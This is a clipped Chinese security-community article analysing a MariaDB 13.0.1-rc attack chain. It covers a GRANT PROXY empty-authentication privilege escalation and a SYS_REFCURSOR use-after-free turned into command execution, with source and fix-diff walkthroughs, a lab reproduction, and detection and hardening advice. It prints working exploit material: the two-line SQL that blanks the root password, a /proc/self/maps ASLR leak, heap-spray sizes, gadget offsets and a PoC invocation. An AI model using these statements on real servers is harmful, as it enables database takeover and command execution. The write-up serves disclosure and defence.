---
title: 【先知】空密码的授权令：MariaDB 纯 SQL 攻击链，从 lowpriv 到容器内命令执行
source: https://xz.aliyun.com/news/92718
source_host: xz.aliyun.com
clip_date: 2026-08-21T15:29:34+08:00
trace_id: eaf4608f-59a8-4f10-8c05-957113a232e3
content_hash: 6ec4c949ae53c38d23dbeed16a3891fe090ebaf7dd0607ada9a7f46df4f17f76
status: synced
tags:
  - 先知
  - 漏洞分析
  - 数据库安全
series: null
feed_source: 先知安全技术社区
ai_summary: 仅凭3306端口上的低权限SQL账号，利用GRANT PROXY空认证跳过检查提权为root，再借SYS_REFCURSOR游标数组UAF配合JOP链，在容器内以uid 999执行任意命令。
ai_summary_style: key-points
images_status:
  total: 7
  succeeded: 7
  failed_urls: []
notion_page_id: 3c375244-d011-81b4-8172-f176fe3efca3
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> 仅凭3306端口上的低权限SQL账号，利用GRANT PROXY空认证跳过检查提权为root，再借SYS_REFCURSOR游标数组UAF配合JOP链，在容器内以uid 999执行任意命令。
> 
> - **F-09提权根因：** `GRANT PROXY ... IDENTIFIED VIA ''` 被 `has_auth()` 当作“未指定认证”，授权权限检查被跳过，`replace_user_table()` 照常把root密码改为空；修复只进开发分支，13.0.1到10.6.27发布版均无补丁，已编号QVD-2026-48306。
> - **F-05 UAF根因：** `get_cursor_by_ref()` 返回动态数组内部元素指针；外层游标open时SQL再打开15个额外游标，`sp_cursor_array` 扩容使旧存储释放，缓存指针悬垂；用128个1784字节user变量blob回收1792字节块，偏移0x20埋受控vtable。
> - **利用链：** 提权后用 `LOAD DATA INFILE '/proc/self/maps'` 读进程映射破ASLR；`SET @fake=REPEAT(...,134217728)` 分配128MiB已知地址缓冲；`UNHEX()` 写入JOP布局；`CALL uaf5()` 点火；两个gadget（PIE+0x80da77、PIE+0xe3075b）调system，命令以mysql用户执行，重启容器验证标记。
> - **稳定性支撑：** 披露方4次运行4次成功；每轮重新读maps、重新验证mmap槽位，地址漂移则重新烘焙自引用重试，把不确定项变成可查询可验证的确定项。
> - **检测与加固：** SQL侧可查 `mysql.proxies_priv` 与 `mysql.user` 定位PROXY授权；配置 `secure_file_priv` 限制读/proc/self/maps、`max_allowed_packet=16M` 限制大变量，但文章注明这些措施未逐项实测，需先在测试环境验证不影响业务。

## 一、前言

2026 年 5 月底发布的 MariaDB 13.0.1-rc，带着一条完整的远程代码执行攻击链。

攻击者手里只有一个低权限数据库账号——只有 USAGE 权限，连建表都得看别人脸色。他唯一的外界通道是 3306 端口的 TCP 连接。然后他只用 SQL 语句，就把这条链从头走到尾：先把自己变成 数据库root（DBA），再读出服务进程的内存布局，接着堆利用，在容器内以 mysql 用户（uid 999）执行任意命令。

利用链本身完全由 SQL 语句完成，不需要读写 `/proc/<pid>/mem` 、不需要 root 密码。唯一的外部操作是最后重启容器读取结果标记（见第六节）。所有地址都是运行时从服务进程自己嘴里问出来的——攻击者的全部弹药，都是从目标自己身上现取现用。

这条链由两个独立缺陷拼成：

-   一个是权限提升： `GRANT PROXY` 语句在显式指定空认证时，权限检查被整个跳过，任意用户可以把 root 账号的密码覆盖成空——一条语句，无需任何权限
-   一个是内存破坏：SYS_REFCURSOR 存储过程游标数组的 use-after-free，配合堆喷射和 JOP 链，拿到任意命令执行

修复状态更值得玩味。提权那个缺陷，官方在开发分支修了，但补丁没进任何发布版本——从 13.0.1 一路追溯到 10.6.27，全线裸奔。UAF 那个（F-05），官方 JIRA 有同类的游标 use-after-free 修复记录（MDEV-38561，Critical，修复于 13.0.2 / 11.8.9 / 11.4.13），但其根因是 sp_lex_instr 的 mem_root 重复释放，与本文 F-05 的游标数组扩容悬垂指针并非同一处。国内漏洞库已经给出编号 QVD-2026-48306 的风险通告，并验证了可复现。

## 二、两个缺陷各是什么

先分别认识这两个漏洞，再看它们怎么拼成链。

### F-09：GRANT PROXY 的语义漏洞

GRANT PROXY 是 MariaDB/MySQL 的代理授权语法。它可以允许一个账号"代理"另一个账号的身份登录，常用于中间层账号接管业务账号。既然是"代替别人登录"，这个语法的信任模型天然敏感——所以正常设计里，执行 GRANT PROXY 必须通过授权者权限检查，不是谁想发就能发的。

关键在 `IDENTIFIED VIA` 子句——它指定代理登录时的认证方式。语法允许显式写一个空认证： `IDENTIFIED VIA ''` 。

正常流程下，用户执行 GRANT PROXY 时，服务器要检查执行者是否有资格发出这条授权（有没有相应权限）。问题就出在"显式空认证"的处理上：服务器把"我明确写了空认证"和"我根本没写认证"混为一谈。

于是这条语句畅通无阻：

```sql
GRANT PROXY ON CURRENT_USER() TO 'root'@'%' IDENTIFIED VIA '';
```

执行者不需要任何 GRANT 权限。服务器跳过了权限检查，然后按字面意思执行：把 root 账号的认证信息替换成空密码。瞬间，整个数据库的最高权限账号，成了一个密码为空的敞口账号。

### F-05：SYS_REFCURSOR 的 use-after-free

存储过程支持游标。MariaDB 里有一类特殊游标叫 SYS_REFCURSOR，可以动态打开。存储过程执行期间，这些游标由 `sp_cursor_array` 这个动态数组统一管理。

问题出在数组的"内部指针"上：某个函数把数组内部元素的地址直接返回给调用方，而数组本身是动态的——元素增加时底层存储会被重新分配。旧地址立即失效，但调用方不知道。

攻击者恰好能控制"元素增加"的时机：游标 open 时执行的是攻击者写的 SQL，SQL 里再打开更多游标，数组就长大了。缓存的那个指针，指向的已经是释放掉的旧存储。

**两个洞单独看都只是"经典"级别的缺陷，组合起来就是一条从数据库账号到操作系统命令的直达通道。**

## 三、F-09 源码走读：一次被跳过的授权检查

### 3.1 入口：GRANT PROXY 语句

攻击入口是任意低权限账号都能执行的 SQL 语句。语法解析时， `IDENTIFIED VIA ''` 会被解析成一个"认证对象"。修复前的语法规则无条件预分配这个对象——不管用户写没写认证子句，解析器都先造一个空的 `USER_AUTH` 结构。

### 3.2 传递：has_auth() 的语义判断

真正的判断在 `LEX_USER::has_auth()` 。修复前它的实现是：

```cpp
return auth && (auth->plugin.length || auth->auth_str.length || auth->pwtext.length);
```

plugin、密码、文本三个字段全空 → 整体返回 false。

字面上看挺合理：没有认证信息嘛。但语义错了—— `IDENTIFIED VIA ''` 是"我显式指定了空认证"，不是"我没指定认证"。这两者的区别，正是漏洞的全部。

`has_auth()` 返回 false 意味着调用方认为"这条 GRANT PROXY 没有带认证子句"。而带认证子句和不带，走的检查路径完全不同。修复的提交信息把这件事说得很白：

> "empty password and empty plugin name don't mean 'authentication was not specified', they mean 'empty authentication was specified'"

空密码 + 空插件名，不等于"没指定认证"，等于"指定了空认证"。

### 3.3 汇聚点：权限检查被跳过，写入照常执行

`has_auth()` 返回 false 后，调用链跳过了对授权者的权限检查（检查会拒绝权限不足的授权请求）。但写库的动作没有跳过： `replace_user_table()` 依然执行，把 root 账号的认证信息替换成空密码。

概括一下这个缺陷： **判断"有没有认证"的逻辑，被"认证内容是否为空"的逻辑覆盖了。** 修复前它俩是同一个判断，修复后才是两个。

### 3.4 修复 diff 走读

修复 commit 改了两个文件，逻辑非常干净：

`sql/structs.h` —— `has_auth()` 改成只判空指针：

```cpp
-    return auth && (auth->plugin.length || auth->auth_str.length || auth->pwtext.length);
+    return auth;
```

`sql/sql_yacc.yy` ——删除无条件预分配，让"没写认证子句"真正表现为 `auth == NULL` ：

```cpp
-        $$->auth= new (thd->mem_root) USER_AUTH();
```

从此，空指针 = 没指定认证；非空对象（哪怕字段全空）= 显式指定了空认证。后者必须走完整的授权检查。

配套的回归测试也很有意思：新建一个无密码用户，让他尝试 GRANT PROXY（指定 'foo' 或空字符串认证），预期结果是权限拒绝错误——修复前这类尝试不会触发权限拒绝，授权请求在检查阶段就被放行了。

## 四、F-05 源码走读：悬垂的内部指针

### 4.1 入口：SYS_REFCURSOR 的 OPEN

存储过程里声明游标，执行 `OPEN ... FOR SELECT ...` 时，服务器从游标数组里取出对应元素。取元素的核心函数 `get_cursor_by_ref()` ，源码（sql/sp_cursor.cc）：

```cpp
sp_cursor_array_element *sp_cursor_array::get_cursor_by_ref(THD *thd,
                                                            Field *ref_field,
                                                            bool for_open)
{
  Type_ref_null ref= ref_field->val_ref(thd);
  if (ref < (ulonglong) elements())
    return &at((size_t) ref.value()); // "ref" points to an initialized sp_cursor
  ...
```

注意看那行： `return &at(...)` 。它返回的是 **数组内部存储的元素地址**——一个指向动态数组内部的原始指针。

### 4.2 传递：append 触发存储重分配

数组的类型是 Dynamic_array。它的增长路径（sql/sql_array.h）：

```cpp
void append(const Elem &el) { insert_dynamic(&array, &el); }
```

`insert_dynamic()` 在容量不足时重新分配底层 buffer——旧 buffer 被释放，元素搬进新地址。

危险就在这： `get_cursor_by_ref()` 返回的内部指针被调用方缓存，而游标 open 的过程中，执行的是攻击者可控的 SQL。SQL 里再打开更多游标 → 数组 append → 存储重分配 → 旧指针悬垂。攻击链的构造里，这一步被精确编排：外层游标 open 的 SQL 里，打开 15 个额外游标，配合三轮回分配/释放的"诱饵"对象，把数组顶到增长点。数组一增长，外层持有的指针就成了悬垂指针。

### 4.3 汇聚点：用悬垂指针做虚拟派发

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/fa9301cc7654eaa4.png)

悬垂指针指向的内存已被释放，但分配器还没把这块 1792 字节（16 个游标元素 × 112 字节）分给别人。攻击者用 128 个 1784 字节的用户变量 blob 做堆喷射，把这块空间"精确回收"。每个 blob 的偏移 0x20 处（恰好是 `sp_cursor` 结构里 `result` 成员的位置）埋着攻击者控制的 vtable 指针。后续代码对悬垂指针做虚拟派发 `result->prepare()` ，实际取到的 vtable 是攻击者布的局。

**一个"返回内部指针"的省事写法，加上"可控时机的数组增长"，拼成了一个稳定可触发的 UAF——而且这个 UAF 的触发完全靠 SQL 完成。**

## 五、攻击链全程拆解

整个链条分六步，先看全景，再拆细节。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/77117351567514de.png)

### 第一步：一条 GRANT PROXY 换一个 root

低权限账号执行：

```sql
GRANT PROXY ON CURRENT_USER() TO 'root'@'%' IDENTIFIED VIA '';
GRANT PROXY ON CURRENT_USER() TO 'root'@'localhost' IDENTIFIED VIA '';
```

两行，没有权限门槛。执行完，root 的密码为空。攻击者用 `root` + 空密码重新连接，已经是数据库的最高权限。

### 第二步：从服务进程嘴里问出内存布局

提权后有了 FILE 权限。原版镜像里 `secure_file_priv` 未设置，意味着 `LOAD DATA INFILE` 可以读服务器进程能读的任何文件——包括它自己的内存映射：

```sql
LOAD DATA INFILE '/proc/self/maps' INTO TABLE appdb.maps_pre;
```

`/proc/self/maps` 列出 mariadbd 进程的全部内存段：PIE 基址、libc 基址，一行一行躺着。ASLR 当场失效。

### 第三步：要一块地址已知的大缓冲区

JOP 链需要一块"攻击者可控内容 + 地址已知"的内存。SQL 侧的办法是用户变量：

```sql
SET @fake = REPEAT(CHAR(0xDE), 134217728);
```

128 MiB 的 REPEAT 结果。glibc 对这么大的分配走 mmap，给它一块专有区域（数据起始偏移 +0x30）。这块区域的地址通过 maps 前后对比算出来——同样是从 SQL 侧完成。

### 第四步：把 JOP 布局写进缓冲区

地址已知，内容可控，把利用布局写进去： `SET @fake = CONCAT(REPEAT(...), UNHEX('<布局>'), REPEAT(...))` 。

UNHEX 解决了"SQL 里塞二进制"的问题。布局里的自引用指针（vtable 指向命令字符串）用第三步算出的地址烘焙进去。glibc 在释放旧块再分配时复用同一个 mmap 槽位，地址稳定——每一步都重新验证，槽位万一挪了就把地址重新烘焙重试。

### 第五步：CALL uaf5() 点火

核心触发语句就一个：

```sql
CALL uaf5();
```

过程体里：打开一个 SYS_REFCURSOR，其 open 的 SQL 执行 `grow5()` ——里面 15 个游标加诱饵分配把数组顶到增长点，随后释放的 1792 字节块被预先排好的 128 个 blob 回收。回收 blob 的偏移 0x20 处是受控 vtable。虚拟派发走：

```plain
; 虚拟派发机制示意（非实际反汇编）
result->prepare()
  -> mov rax, [result]      ; rax = 攻击者的 vtable 指针
  -> call [rax + 0x20]      ; D2 gadget
```

### 第六步：两个 gadget 直达 system()

JOP 链只有两个 gadget，全部来自原版二进制，没有 ROP、没有栈迁移：

|     |     |     |     |
| --- | --- | --- | --- |   
| Gadget | 偏移  | 指令  | 用途  |
| D2  | PIE+0x80da77 | `call *0x100(%rax)` | 栈对齐修正 |
| D1  | PIE+0xe3075b | `mov rdi,[rax+0xa8]; call [rax+0xa0]` | 取命令字符串指针，调 system() |

五个偏移各司其职，布局如下：

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/2e5edd6934eaa0dc.png)

执行以 uid 999（mysql 用户）身份完成。命令跑完，服务进程崩溃——对利用者来说正好，崩溃即证明。重启容器读标记文件，收工。

**六个步骤，五个在 SQL 里完成，唯一的外部操作是重启容器看结果。**

## 六、本机复现

链讲得再细，不如跑一遍。环境是 Docker + 原版 13.0.1-rc 镜像，没有做任何修改。

### 6.1 环境准备

项目地址： [https://github.com/dinosn/mariadb-13-rce-lab](https://github.com/dinosn/mariadb-13-rce-lab)

拉下来是这样的

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/a135f632342735f8.png)

当前复现的环境是在kali中，部署命令如下

```bash
docker-compose up -d
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/7b5fb4738ba394d5.png)

### 6.2 执行poc

默认是3306 可详见yml那个文件

```bash
python3 exploit_pure_sql.py  --host 127.0.0.1 --port 3306 --user lowpriv --password lowpriv  --command "id > /tmp/pwned"  --marker /tmp/pwned --container mariadb-rce-lab
```

脚本会自动完成：读 maps 拿基址、分配 128 MiB 缓冲、写 JOP 布局、触发 UAF、执行命令。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/4dcdb9db8f8c1a75.png)

### 6.3 结果

命令以 uid 999（mysql 用户）在容器内执行，标记文件写入成功，收工。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/fa26c4827443415a.png)

tip：注意不是去自己kali的tmp目录下看，得去容器里面，别跟我一样犯傻了。

**复现结论：从环境搭建到命令执行全程走通，利用链本身完全由 SQL 完成；唯一的外部操作是重启容器验证结果**

## 七、为什么这条纯 SQL 链值得琢磨

技术层面，这条链最值得琢磨的是它的工程思路——攻击者只有 SQL 一个接口，怎么把"任意命令执行"从数据库里抠出来。

第一道坎是二进制载荷。SQL 的字符串是文本，但指针是 8 字节二进制。解法是 UNHEX——把十六进制文本转回原始字节，MySQL/MariaDB 的字符串函数天然支持。SQL 的文本世界和内存的字节世界，靠一个函数打通。

第二道坎是自引用。JOP 布局里的 vtable 要指向自己的命令字符串，但写布局的时候，地址还不知道。解法是分两步走：先分配一块纯填充的 128 MiB 标记缓冲，从 maps 里 diff 出新区域算出地址；再重新分配完整布局——glibc 复用同一个 mmap 槽位，地址不变。地址已知的问题，被分配器的确定性行为解决了。

第三道坎是精确回收。UAF 释放的块是 1792 字节，喷射的 blob 是 1784 字节，差 8 字节对齐到 glibc 的 chunk 尺寸——不多不少，正好吃掉同一个 chunk。堆喷射不是乱喷，是测过尺寸的精准覆盖。

第四道坎是控制流。不用 ROP（需要栈迁移和大量 gadget），选 JOP：两个 gadget，一个调 `call *0x100(%rax)` 修正栈对齐，一个把命令字符串装进 rdi 再调 system。控制流在攻击者自己的数据里跳舞，gadget 只做搬运。

第五道坎是稳定性。整条链跑在四个全新 ASLR 基址上，任何一步地址漂移都会前功尽弃。披露方的测试结果是 4 次运行 4 次成功——每轮都从 maps 重新读取基址、重新验证 mmap 槽位，地址一旦挪动就把自引用重新烘焙重试。纯 SQL 的利用不是碰运气，是把每个不确定项都变成可查询、可验证的确定项。

这套思路的价值在于： **它演示了数据库攻击从"注入进 SQL"到"SQL 即利用语言"的转变。** 传统的 SQL 注入还在拼字符串，这里的攻击者已经在 SQL 里完成整个内存利用工程。

## 八、影响与修复状态

影响面评估很直白：

-   F-09（提权）影响 **所有** 发布版本——修复提交在开发分支，13.0.1 到 10.6.27 的每个发布版都不含补丁
-   F-05（UAF）：MariaDB 官方已有游标 use-after-free 修复记录（MDEV-38561，Critical，修复于 13.0.2 / 11.8.9 / 11.4.13）；本文分析的 `get_cursor_by_ref` 悬垂指针路径与 MDEV-38561 是否同一处，需对照官方 commit 确认
-   攻击起点低：任意低权限账号 + 3306 端口可达；但完整利用链还依赖 F-09 提权成功（未含补丁的版本）以及 `secure_file_priv` 未设置（才能读 `/proc/self/maps` ）

国内漏洞库已发布编号 QVD-2026-48306 的风险通告并验证可复现，说明这条链已经进入国内应急响应视野。

有一个细节值得单独说：F-09 的补丁躺在开发分支上，发布分支没合入。这种"修了但没发布"的状态在数据库这种长周期产品里很常见，但危害是实打实的——补丁存在的消息本身就是一张攻击面地图，而修复没到位的版本还是照常对外提供服务。

## 九、检测与加固

这个攻击链有明确的检测抓手——链的前两步（提权、读文件）都是高特征的 SQL 行为。

### 9.1 SQL 侧检测（最有效）

链的起点是 GRANT PROXY 授权，这是可以用查询直接抓的：

```sql
-- 查找所有 PROXY 授权（正常业务极少使用）
SELECT * FROM mysql.tables_priv WHERE Table_priv LIKE '%PROXY%';
SELECT * FROM mysql.proxies_priv;

-- 查找 root 账号的认证信息是否被改动（密码哈希非空应为正常）
SELECT User, Host, plugin, authentication_string
FROM mysql.user WHERE User IN ('root', 'admin');

-- 审计日志中搜索特征语句（若开启 general_log）
SELECT * FROM mysql.general_log
WHERE argument LIKE '%GRANT PROXY%' OR argument LIKE '%IDENTIFIED VIA%';
```

GRANT PROXY 在正常业务里几乎不出现，出现即可疑。

### 9.2 配置加固

以下措施是理论层面的阻断建议，本文未逐一实测验证，落地前需在测试环境确认有效且不影响业务。针对攻击链的三个支点，各封一刀：

```bash
# 1. 阻断 /proc/self/maps 读取（打破 ASLR 泄露）
#    my.cnf 中设置：
#    [mysqld]
#    secure_file_priv = /var/lib/mysql-files

# 2. 限制大用户变量（阻断 128 MiB mmap 缓冲）
#    my.cnf 中设置：
#    max_allowed_packet = 16M

# 3. 监控 mysql.user 表变更（捕捉提权动作）
#    建议用数据库审计插件或外部 SIEM 监控 GRANT 语句执行
```

注意 secure_file_priv 的设置会同时影响正常业务的文件导入导出——改之前先评估业务侧。max_allowed_packet 同理，压得太狠可能伤到合法的大查询。

### 9.3 版本策略

-   优先等官方发布含 F-09 修复的稳定版本并跟进升级
-   对无法升级的环境：数据库账号最小化（低权限账号不允许 GRANT）、数据库端口不暴露公网、数据库账号密码定期轮换
-   关注官方安全公告中 F-05（SYS_REFCURSOR）的修复进展

## 十、反思

写完这条链，我有三件事想说。

第一件，关于"空值语义"。F-09 的根子是"空字符串和未指定被当成一回事"。这个坑在数据库生态里反复出现：NULL 和空串、默认密码和显式空密码、未设置和设置为空。GRANT PROXY 这次翻车在认证检查上，下一个可能翻在别的地方。审计这类代码时，"区分没说话和说了句空话"应该是个固定检查项。

第二件，关于修复流程。补丁躺在开发分支三个月，发布分支一个没有——这件事比漏洞本身更值得警惕。对攻击者来说，读 commit 日志就能画出攻击面；对防御者来说，"修了"和"可修复"之间的真空期，是唯一真正危险的窗口。

第三件，关于 SQL 的攻击面。这条链的利用全程用 SQL 完成，从提权到内存布局到命令执行，没有一个环节需要数据库之外的接口。这对检测体系是个提醒：数据库审计如果只看"注入了什么"，看不到"SQL 本身在干什么"，那么下一场攻防里，SQL 就是攻击者的完整武器库。基于已验证事实的推测：MariaDB 服务端还有多少类似 get_cursor_by_ref 的"省事返回内部指针"的写法，我没有数过，但值得数一数。
